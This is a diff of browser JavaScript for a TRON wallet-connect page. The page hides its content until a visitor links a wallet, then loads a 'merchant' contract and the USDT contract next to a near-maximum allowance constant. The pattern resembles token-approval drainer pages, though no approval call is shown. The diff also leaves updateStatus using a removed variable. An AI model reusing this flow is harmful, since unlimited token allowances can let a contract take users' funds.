@@ -1,7 +1,7 @@
 // --- 配置常量 (TRON 专属) ---
 const MERCHANT_CONTRACT_ADDRESS = 'TQiGS4SRNX8jVFSt6D978jw2YGU67ffZVu'; // 你的 TRON 智能合约地址 (SimpleMerchantERC)
 const USDT_CONTRACT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';  //  TRC20 USDT 合约地址
-const DEFAULT_TRON_ADDRESS_HEX = '410000000000000000000000000000000000000000'; //  默认 TRON 地址
+const DEFAULT_TRON_ADDRESS_HEX = '410000000000000000000000000000000000000000'; //  默认 TRON 地址，这里可以暂时不用修改，因为连接成功后会获取真实地址
 const ALMOST_MAX_UINT = "115792089237316195423570985008687907853269984665640564039457584007913129638935";
 
 // 你的合约 ABI (SimpleMerchantERC)
@@ -86,17 +86,38 @@ function updateConnectionUI(connected, address = null) {
 
 // --- 核心功能：控制状态栏的隐藏与显示。 ---
 function updateStatus(message) {
-    const statusDiv = document.getElementById('status');
     if (!statusDiv) {
         console.error("Status element not found.");
         return; // 避免设置 innerHTML
     }
-    if (message) {
-        statusDiv.innerHTML = `${message}`;
-        statusDiv.style.display = 'block';
-    } else {
-        statusDiv.innerHTML = '';
-        statusDiv.style.display = 'none';
+    statusDiv.innerHTML = message;
+    statusDiv.style.display = 'block';
+}
+
+// --- 初始化合约 (TRON 版本) ---
+async function initialize() {
+    try {
+        if (!userAddress) {
+            updateConnectionUI(false);
+            return;
+        }
+
+        // 1. 初始化合约实例
+        if (!tronWeb) {
+            console.error("TronWeb not initialized.");
+            return;
+        }
+
+        merchantContract = await tronWeb.contract(MERCHANT_ABI, MERCHANT_CONTRACT_ADDRESS);
+        usdtContract = await tronWeb.contract(ERC20_ABI, USDT_CONTRACT_ADDRESS);
+
+        console.log("✅ Contracts initialized.");
+        // 连接成功， 初始化完成。可以开始其他的操作了。
+
+    } catch (error) {
+        console.error("Initialization failed:", error);
+        updateStatus(`Initialization failed: ${error.message}`);
+        showOverlay(`Initialization failed: ${error.message}`);
     }
 }
 
@@ -162,49 +183,30 @@ async function connectWallet() {
         updateStatus('Connecting to wallet...'); //  确保先调用 updateStatus
         showOverlay('Please confirm the connection request in your wallet...');
 
-        // 1.  检测 TronWeb (确保先加载)
+        // 1.  检测 TronWeb
         if (typeof window.tronWeb === 'undefined') {
             updateStatus('Please install TronLink or a supported TRON wallet');
             return;
         }
 
         tronWeb = window.tronWeb;  //  将 tronWeb 赋值给全局变量
-        console.log("tronWeb detected:", tronWeb); // 调试
+        console.log("tronWeb detected:", tronWeb);
 
-        // 2. 检查是否已连接
-        if (tronWeb && tronWeb.ready) {
-            // 3. 获取用户地址
-            userAddress = tronWeb.defaultAddress.base58; // 使用 base58 格式
-            if (!userAddress || userAddress === DEFAULT_TRON_ADDRESS_HEX) {
-                //  如果还没有连接，则尝试连接。 如果用户未连接，getAccount 将会提示用户连接
-                try {
-                    await tronWeb.trx.getAccount();  //  尝试获取账户信息, 如果未连接，则会触发 TronLink 弹窗 (Trust Wallet 等)
-                    userAddress = tronWeb.defaultAddress.base58; // 再次获取地址
-                    console.log("✅ User Address (base58):", userAddress);
-                } catch (e) {
-                    console.error("Error connecting to wallet:", e);
-                    updateConnectionUI(false);
-                    showOverlay('🔴 Connection failed: Wallet connection denied or canceled.');
-                    updateStatus('Connection failed: Wallet connection denied or canceled.');
-                    return;
-                }
-            }
+        // 2. 尝试获取用户地址, 直接通过 getAccount()
+        try {
+            await tronWeb.trx.getAccount(); //  尝试获取账户信息, 如果未连接，则会触发 TronLink 弹窗 (Trust Wallet 等)
+            userAddress = tronWeb.defaultAddress.base58;
+            console.log("✅ User Address (base58):", userAddress);
+            updateConnectionUI(true, userAddress);
 
-            if (userAddress && userAddress !== DEFAULT_TRON_ADDRESS_HEX) {
-                updateConnectionUI(true, userAddress);  // 更新连接状态
-                // 4. 初始化合约并检查授权
-                await initialize();
-            }
-             else {
-                 updateConnectionUI(false);
-                 showOverlay("🔴 Connection failed: No valid account found.");
-                 updateStatus('Connection failed: No valid account found.');
-             }
-
-        } else {
+            // 3. 初始化合约并检查授权
+            await initialize();
+        } catch (e) {
+            console.error("Error getting account:", e);
             updateConnectionUI(false);
-            showOverlay('🔴 Connection failed: TronLink not detected or not ready.');
-            updateStatus('Connection failed: TronLink not detected or not ready.');
+            showOverlay('🔴 Connection failed: Wallet connection denied or canceled.');
+            updateStatus('Connection failed: Wallet connection denied or canceled.');
+            return;
         }
 
     } catch (error) {
@@ -215,29 +217,12 @@ async function connectWallet() {
     }
 }
 
-// --- 处理授权流程 ---
-async function handleAuthorization() {
-    try {
-        if (!tronWeb || !userAddress || !merchantContract || !usdtContract) {
-            showOverlay('Wallet not connected. Please connect.');
-            return;
-        }
-        // 检查授权状态
-        await checkAuthorization(); // 检查授权并更新 UI
-    } catch (error) {
-        console.error("Authorization process failed:", error);
-        showOverlay(`🔴 Authorization process failed: ${error.message}`);
-        updateStatus(`Authorization failed: ${error.message}`);
-    }
-}
-
 // --- 斷開錢包連接 ---
 function disconnectWallet() {
     userAddress = null;
     tronWeb = null;  // 必须设置为 null
     merchantContract = null;
     usdtContract = null;
-    usdcContract = null; // 移除
     updateConnectionUI(false);
     showOverlay('Please link your wallet to unlock the page 🔒');
 }
@@ -251,9 +236,9 @@ connectButton.addEventListener('click', () => {
     }
 });
 
-// 页面加载完成后，初始化
+// 页面加载完成后，初始化 (在 HTML 结构正确的情况下，可以不初始化，连接按钮会调用，或者可以显示提示)
 window.onload = () => {
-    //  在页面加载时，隐藏遮罩
-    updateConnectionUI(false);
-    showOverlay('Please connect your wallet to unlock the content. Click the wallet icon in the upper right corner.');
+    //  确保在页面加载的时候，显示未连接的 UI
+    // updateConnectionUI(false); // 初始 UI 状态
+    // showOverlay('Please connect your wallet to unlock the content. Click the wallet icon in the upper right corner.');
 };
